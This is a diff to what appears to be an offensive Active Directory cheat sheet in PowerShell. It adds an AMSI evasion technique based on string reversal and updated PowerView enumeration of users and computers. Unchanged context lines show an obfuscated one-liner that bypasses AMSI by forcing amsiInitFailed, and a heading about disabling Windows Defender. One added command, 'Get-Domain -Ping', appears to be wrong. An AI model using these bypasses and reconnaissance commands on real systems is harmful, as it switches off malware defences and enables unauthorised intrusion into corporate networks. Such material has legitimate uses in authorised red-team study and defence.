@@ -90,6 +90,19 @@ Import-Module .\ActiveDirectory\ActiveDirectory.psd1
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
+# PowerShell AMSI Evasion
+
+```powershell
+# Use AMSITrigger to find malicious lines in a script:
+# amsitrigger64.exe -i PowerUp.ps1
+# Result is: $AppDomain = [Reflection.Assembly].Assembly.GetType("Sytem.AppDomain").GetProperty('CurrentDomain').GetValue($null,@())
+# The problem here is the "System.AppDomain" string which gets detected
+# Use a reverse function to bypass like this:
+$String = 'niamoDppA.metsyS'
+$classrev= ([regex]::Matches($String.'RightToLeft') |  ForEach {$_.value}) -join ''
+$AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null,@())
+```
+
 # Windows Defender
 
 ### Disable Windows Defender
@@ -173,27 +186,24 @@ Get-ADDomain -Identity other.domain.FQDN
 - **With PowerView**:
 ```powershell
 # Get the list of users
-Get-NetUser
-# Fitler by username
-Get-NetUser -Username user01                          
-# Grab the cn (common-name) from the list of users
-Get-NetUser | select cn                           
-# Grab the name from the list of users
-Get-NetUser | select name
+Get-DomainUser
+
+# Get User by username
+Get-DomainUser -Identity user01
+
+# Get User with Filter by description
+Get-DomainUser -LDAPFilter "Description=*built*"
+
+# Grab only some attributes of the user
+Get-DomainUser -LDAPFilter "Description=*built*" | select name,description
+
 # Get actively logged users on a computer (needs local admin rights on the target)
-Get-NetLoggedon -ComputerName <servername>
-# List all properties
-Get-UserProperty                                      
-# Display when the passwords were set last time
-Get-UserProperty –Properties pwdlastset               
-# Display when the accounts were created
-Get-UserProperty -Properties whencreated              
+Get-NetLoggedon -ComputerName <hostname>
 ```
 - **With AD Module**:
 ```powershell
 # Get the list of users
 Get-ADUser -Filter *
-
 # Get the list of users with properties
 Get-ADUser -Filter * -Properties *                                                                        
 # List samaccountname and description for users
@@ -205,6 +215,39 @@ Get-ADUser -Filter * -Properties * | select name
 # Displays when the password was set
 Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
 ```
+
+### Computers Enumeration
+
+- **With PowerView:**
+```powershell
+# Get the list of computers in the current domain
+Get-DomainComputer
+
+# Get the list of computers in the current domain with complete data 
+Get-DomainComputer | Select name,operatingsystem
+
+# Get the list of computers with operating system "Windows Server 2019"
+Get-DomainComputer -OperatingSystem "Windows Server 2019*"
+
+# Find all computer that are alive (use a ping, host firewall may generate false negative) 
+Get-Domain -Ping                                 
+```
+- **With AD Module:**
+```powershell
+# Get the list of computers in the current domain 
+Get-ADComputer -Filter * | select name
+
+# Get the list of computers in the current domain with complete data 
+Get-ADComputer -Filter * -properties * | select name
+
+# Get the list of computers filtering by Operating system ("server 2019")
+Get-ADComputer -Filter 'OperatingSystem -like "*Server 2019*"' -properties * | select name,OperatingSystem   
+
+# Get the list of computers grabbing their name
+Get-ADComputer -Filter * | select Name                                               
+```
+
+
 
 ### Domain Admins Enumeration
 
@@ -235,30 +278,6 @@ Get-ADDomain -Identity corporate.local
 (Get-DomainPolicy)."system access"                    
 ```
 
-### Computers Enumeration
-
-- **With PowerView:**
-```powershell
-# Get the list of computers in the current domain
-Get-NetComputer                                       
-# Get the list of computers in the current domain with complete data 
-Get-NetComputer -FullData                             
-# Get the list of computers grabbing their operating system
-Get-NetComputer -FullData | select operatingsystem    
-# Get the list of computers grabbing their name
-Get-NetComputer -FullData | select name               
-# Send a ping to check if the computers are alive (They could be alive but still not responding to any ICMP echo request)
-Get-NetComputer -Ping                                 
-```
-- **With AD Module:**
-```powershell
-# Get the list of computers in the current domain with complete data 
-Get-ADComputer -Filter * -Properties *                                               
-# Get the list of computers grabbing their name and the operating system
-Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSystem   
-# Get the list of computers grabbing their name
-Get-ADComputer -Filter * | select Name                                               
-```
 
 ### Groups and Members Enumeration
 
